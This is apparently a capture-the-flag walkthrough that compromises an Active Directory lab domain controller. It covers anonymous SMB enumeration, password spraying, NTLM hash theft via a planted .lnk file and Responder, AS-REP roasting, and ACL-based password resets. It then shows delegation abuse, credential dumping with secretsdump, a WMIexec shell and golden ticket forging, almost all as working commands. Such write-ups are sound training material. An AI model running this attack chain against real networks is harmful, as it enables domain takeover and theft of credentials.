# Reset

## Machine Information

Parent DC

Domain name: `thm.corp`

FQDN:  `HayStack.thm.corp`

Domain SID: `S-1-5-21-1966530601-3185510712-10604624`&#x20;



## Ports Scan

```bash
nmap -T4 -A -p- --min-rate 1000 10.10.178.64 -oN port_scan.txt -Pn

Nmap scan report for thm.corp (10.10.178.64)
Host is up (0.037s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-28 09:35:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=HayStack.thm.corp
| Not valid before: 2025-07-27T08:51:13
|_Not valid after:  2026-01-26T08:51:13
|_ssl-date: 2025-07-28T09:37:16+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: HAYSTACK
|   DNS_Domain_Name: thm.corp
|   DNS_Computer_Name: HayStack.thm.corp
|   DNS_Tree_Name: thm.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2025-07-28T09:36:36+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
57122/tcp open  msrpc         Microsoft Windows RPC
```



## Initial Access

### SMB Shares enum

```bash
smbclient -L //10.10.178.64 -N
smbclient -N //10.10.178.64/Data
```

In this share we found 3 files. 2 pdf file and 1 txt contains this.

{% code overflow="wrap" %}
```bash
cat 11t0pmx3.ktr.txt

Subject: Welcome to Reset -�Dear <USER>,Welcome aboard! We are thrilled to have you join our team. As discussed during the hiring process, we are sending you the necessary login information to access your company account. Please keep this information confidential and do not share it with anyone.The initial passowrd is: ResetMe123!We are confident that you will contribute significantly to our continued success. We look forward to working with you and wish you the very best in your new role.Best regards,The Reset Team.
```
{% endcode %}

There is a default password that we can use to perform a password spray attack.

```
ResetMe123!
```

### SMB user enum / Pass Spray

With Guest account and nx tool we can enumerate all AD user.

{% code overflow="wrap" %}
```bash
nxc smb 10.10.178.64 -u 'anonymous' -p '' --rid-brute > user_group_ad.txt

grep 'SidTypeUser' user_group_ad.txt | grep -oE '[A-Za-z0-9_-]+\\[A-Za-z0-9 _-]+' > domain_user_ad.txt
```
{% endcode %}

With this file and the password try to perform password spray attack

{% code overflow="wrap" %}
```bash
crackmapexec smb 10.10.178.64 -u domain_user_ad.txt -p 'ResetMe123!' --continue-on-success

# output
[..snip..]
SMB         10.10.178.64    445    HAYSTACK         [+] THM\LILY_ONEILL:ResetMe123! 
[..snip..]
```
{% endcode %}

We have found a user with default password.

Trying to run bloodhound with this user, we can notice that this user is limitated. It's a Rabbit hole!

### NTLM Theft

If we cannot find another initial access and have access to an SMB share, we can consider uploading a file to steal NTLM user credentials if the file is opened by someone.

Using the tool `ntlm_theft`, create the file.

```bash
python3 ntlm_theft.py -g modern -s 10.23.52.142 -f meeting
```

Start responder on our machine

```bash
sudo responder -I tun0
```

Lastly upload the file into SMB share from SMB share session.

```bash
put meeting.lnk
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now  that we have AUTOMATE hash, we can try to crack it.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt automate_ntlm.txt

Passw0rd1        (AUTOMATE)    
```

Try to access it through WinRM and get user flag.

```bash
evil-winrm -i 10.10.184.120 -u 'AUTOMATE' -p 'Passw0rd1'
```

```bash
more C:\Users\automate\Desktop\user.txt
```

## Bloodhound enumeration

Now with thid found credentials we can enumerate the domain with Bloodhound.

{% code overflow="wrap" %}
```bash
bloodhound-python -c all -ns 10.10.184.120 -dc HayStack.thm.corp -d thm.corp --zip -u 'AUTOMATE' -p 'Passw0rd1'
```
{% endcode %}

### AS-REP Roastable users dump tgt

Get the AS-REP reastable user from Bloodhound query:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Get the TGT of these users with impacket:

```bash
impacket-GetNPUsers THM/LEANN_LONG -dc-ip 10.10.184.120 -dc-host thm.corp -no-pass
impacket-GetNPUsers THM/TABATHA_BRITT -dc-ip 10.10.184.120 -dc-host thm.corp -no-pass
impacket-GetNPUsers THM/ERNESTO_SILVA -dc-ip 10.10.184.120 -dc-host thm.corp -no-pass
```

Put all output in a file and try to crack them.

```bash
john tgts_ticket.txt --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt

# output
marlboro(1985)   ($krb5asrep$23$TABATHA_BRITT@THM) 
```

Set this user as Owned in the Bloodhound graph



## ACL misconf

Try to create a pathfinding from `TABATHA_BRITT` to `ADMINISTRATORS` we obtain this from the query.

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



### GenericAll to SHAWNA\_BRAY user

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

With these rights we can force the SHAWNA\_BRAY's password.

```bash
rpcclient -U THM/TABATHA_BRITT 10.10.184.120
> marlboro(1985)

setuserinfo2 SHAWNA_BRAY 23 'Password123!'
```



### ForceChangePassword to CRUZ\_HALL user

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can change the CRUZ\_HALL's password

```bash
rpcclient -U THM/SHAWNA_BRAY 10.10.184.120
> Password123!

setuserinfo2 CRUZ_HALL 23 'Password123!'
```



### ForceChangePassword to DARLA\_WINTERS user

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
rpcclient -U THM/CRUZ_HALL 10.10.184.120
> Password123!

setuserinfo2 DARLA_WINTERS 23 'Password123!'
```





### AllowedToDelegate to impersonate administrator

<figure><img src="../../../.gitbook/assets/image (329).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
impacket-getST -k -impersonate Administrator -spn cifs/HAYSTACK.THM.CORP THM.CORP/DARLA_WINTERS
```
{% endcode %}

With this ticket we can dump credentials or establish a shell with PsExec oe WMIexec

## Dump credentials with Impacket

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">impacket-secretsdump -no-pass -k -dc-ip 10.10.184.120 THM/administrator@HayStack.thm.corp

# output
<strong>[..snip..]
</strong>Administrator:500:aad3b435b51404eeaad3b435b51404ee:ab4f5a5c42df5a0ee337d12ce77332f5:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:067a84e5afaed843ed4a8fdac5facac3:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ce852eb247bbe2e5818cd8d66ed19ec5:::
krbtgt:aes256-cts-hmac-sha1-96:bed293d4c6efc6bb4fe48d9ff908044d99dd5c04768d76d25cb7743c3689f269
[..snip..]
</code></pre>



## Shell as Administrator with WMIexec

```bash
export KRB5CCNAME=Administrator@cifs_HAYSTACK.THM.CORP@THM.CORP.ccache

impacket-wmiexec THM.CORP/Administrator@HAYSTACK.THM.CORP -k -no-pass
```

<figure><img src="../../../.gitbook/assets/image (330).png" alt=""><figcaption></figcaption></figure>

Now we can print the root flag.

```powershell
more C:\Users\Administrator\Desktop\root.txt
```

## Forge Golden Ticket

Once we dumped the krbtgt hash we can forge the golden ticket to escalate privilege to other parent domain, or request other ST.

{% code overflow="wrap" %}
```bash
impacket-ticketer -nthash "ce852eb247bbe2e5818cd8d66ed19ec5" -domain-sid "S-1-5-21-1966530601-3185510712-10604624" -domain "THM.corp" "Administrator" -groups 512 -user-id 500
```
{% endcode %}

